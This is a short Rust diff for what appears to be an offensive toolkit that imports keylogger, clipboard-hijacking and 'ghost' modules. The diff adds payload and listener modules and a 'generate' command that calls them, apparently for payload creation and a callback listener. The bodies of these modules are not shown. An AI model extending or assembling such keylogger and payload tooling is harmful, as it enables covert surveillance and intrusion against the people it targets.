@@ -1,3 +1,5 @@
+mod payload;
+mod listener;
 mod tools;
 use tools::{ghost, keylogger, clipboard, replaceboard, Tool};
 use std::{
@@ -19,6 +21,10 @@ pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static st
     
     while let Some(arg) = args.next() {
         match arg.as_str() {
+            "generate" => {
+                payload::generate();
+                listener::start();
+            }
             "-t" | "--tool" => {
                 if let Some(value) = args.next() {
                     return Ok(check_tool(&value));
